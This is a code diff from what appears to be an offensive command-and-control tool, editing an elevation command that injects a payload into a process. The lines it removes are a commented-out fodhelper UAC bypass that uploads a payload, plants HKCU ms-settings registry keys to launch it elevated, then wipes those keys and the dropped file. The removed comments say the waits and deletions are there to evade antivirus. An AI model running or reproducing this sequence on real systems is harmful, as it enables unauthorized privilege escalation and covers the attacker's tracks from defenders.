@@ -65,7 +65,8 @@ namespace Commander.Commands.Composite
                 ServerKey = config.ServerConfig.Key,
                 Type = PayloadType.Executable,
                 InjectionDelay =  options.injectDelay,
-                IsInjected = options.inject
+                IsInjected = options.inject,
+                InjectionProcess = options.injectProcess
             };
 
             if (!string.IsNullOrEmpty(options.injectProcess))
@@ -122,95 +123,6 @@ namespace Commander.Commands.Composite
             agent.Delay(2);
             agent.Echo($"[*] Execution done!");
             agent.Echo(Environment.NewLine);
-
-            if (options.inject)
-                commander.WriteInfo($"Due to AV evasion, agent can take a couple of minutes to check-in...");
         }
-
-        //protected override async Task<bool> CreateComposition(CommandContext<ElevateCommandOptions> context)
-        //{
-        //    var agent = context.Executor.CurrentAgent;
-
-        //    //var endpoint = ConnexionUrl.FromString(agent.Metadata.EndPoint);
-        //    var endpoint = ConnexionUrl.FromString($"pipe://127.0.0.1:{context.Options.pipe}");
-
-        //    var options = new PayloadGenerationOptions()
-        //    {
-        //        Architecture =  context.Options.x86 ? PayloadArchitecture.x86 : PayloadArchitecture.x64,
-        //        Endpoint = endpoint,
-        //        IsDebug = false,
-        //        IsVerbose = context.Options.verbose,
-        //        ServerKey = context.Config.ServerConfig.Key,
-        //        Type = PayloadType.Executable,
-        //        IsInjected = context.Options.inject
-        //    };
-        //    if (context.Options.injectDelay.HasValue)
-        //        options.InjectionDelay = context.Options.injectDelay.Value;
-        //    if (!string.IsNullOrEmpty(context.Options.injectProcess))
-        //        options.InjectionProcess = context.Options.injectProcess;
-
-        //    context.Terminal.WriteInfo($"[>] Generating Payload!");
-        //    var pay = context.GeneratePayloadAndDisplay(options, context.Options.verbose);
-        //    if (pay == null)
-        //    {
-        //        context.Terminal.WriteError($"[X] Generation Failed!");
-        //        return false;
-        //    }
-        //    else
-        //        context.Terminal.WriteSuccess($"[+] Generation succeed!");
-
-
-
-
-
-        //    context.Terminal.WriteLine($"Preparing to upload the file...");
-
-        //    var fileName = string.IsNullOrEmpty(context.Options.file) ? ShortGuid.NewGuid() + ".exe" : context.Options.file;
-        //    if (Path.GetExtension(fileName).ToLower() != ".exe")
-        //        fileName += ".exe";
-
-        //    string path = context.Options.path + (context.Options.path.EndsWith('\\') ? String.Empty : '\\') + fileName;
-
-        //    var fileId = await context.UploadAndDisplay(pay, fileName, "Uploading Payload");
-        //    await context.CommModule.TaskAgentToDownloadFile(agent.Metadata.Id, fileId);
-
-        //    this.Step($"Downloading file {fileName} to {path}");
-        //    this.Dowload(fileName, fileId, path);
-        //    this.Delay(1);
-        //    this.Step($"Altering registry Keys");
-        //    this.Shell($"reg add \"HKCU\\Software\\Classes\\.{context.Options.key}\\Shell\\Open\\command\" /d \"{path}\" /f");
-        //    this.Shell($"reg add \"HKCU\\Software\\Classes\\ms-settings\\CurVer\" /d \".{context.Options.key}\" /f");
-        //    this.Delay(1);
-        //    this.Step($"Starting pivot {endpoint}");
-        //    this.StartPivot(endpoint);
-        //    this.Delay(2);
-        //    this.Step($"Starting fodhelper");
-        //    this.Shell("fodhelper");
-        //    this.Delay(2);
-        //    this.Step($"Cleaning");
-        //    this.Powershell($"Remove-Item Registry::HKCU\\Software\\Classes\\.{context.Options.key} -Recurse  -Force -Verbose");
-        //    this.Powershell($"Remove-Item Registry::HKCU\\Software\\Classes\\ms-settings\\CurVer -Recurse -Force -Verbose");
-        //    if (!context.Options.inject)
-        //    {
-        //        this.Echo($"[!] Don't forget to remove executable after use! : shell del {path}");
-        //    }
-        //    else
-        //    {
-        //        this.Step($"Waiting {options.InjectionDelay}s to evade antivirus");
-        //        this.Delay(options.InjectionDelay + 10);
-        //        this.Step($"Removing injector {path}");
-        //        this.Shell($"del {path}");
-        //    }
-        //    this.Echo($"[*] Execution done!");
-        //    this.Echo(Environment.NewLine);
-
-        //    if (context.Options.inject)
-        //    {
-        //        context.Terminal.WriteInfo($"Due to AV evasion, agent can take a couple of minutes to check-in...");
-        //    }
-
-
-        //    return true;
-        //}
     }
 }
